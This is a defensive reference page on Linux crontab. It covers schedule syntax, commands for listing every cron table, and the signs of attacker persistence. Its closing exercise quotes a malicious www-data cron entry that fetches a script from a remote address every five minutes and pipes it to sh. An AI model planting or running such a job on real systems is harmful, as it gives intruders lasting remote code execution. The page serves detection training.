---
title: crontab
summary: Schedules commands to run at set times on Linux, and lists what is scheduled.
side: both
use: open
docs: https://man7.org/linux/man-pages/man5/crontab.5.html
aka: cron
alt: systemctl, auditd
---
## What it's for
cron runs commands on a schedule: backups at night, log rotation, a report every hour. Each user has a table, edited with `crontab -e`, and the system has more in `/etc/crontab` and `/etc/cron.d/`. Because it runs things unattended, it's also one of the first places to check on a machine you suspect.

## How it works
Each line has five time fields, then the command: minute, hour, day of the month, month and day of the week. `30 2 * * *` means 02:30 every day, and `*/10 * * * *` every ten minutes. The system tables add a user field before the command. A job's output is mailed to its owner or lost, so a failing job often fails silently.

## Try it
```
crontab -l
sudo crontab -l -u www-data
cat /etc/crontab
ls -la /etc/cron.d /etc/cron.daily
sudo ls -la /var/spool/cron/crontabs
journalctl -u cron --since today
```

`crontab -l` lists your own jobs. Users' tables live in `/var/spool/cron/crontabs` on Debian and Ubuntu, and in `/var/spool/cron` on Red Hat systems, whose service is called `crond`. Read every table on your machine and say what each job does.

## What defenders see
A job that downloads and runs something every few minutes, a job owned by a web or database account, or one that runs a script from `/tmp` or a hidden folder is a classic way to keep access after a break-in. Watch the scripts that jobs call too: if root runs a script that others can write, anyone can add a line to it. [auditd](/tools/auditd/) can watch the cron folders for changes, and [systemd timers](/tools/systemctl/) are the other place to look.

?! You find `*/5 * * * * curl -s http://203.0.113.9/u | sh` in the crontab of `www-data`. What does it do, and what do you do first?
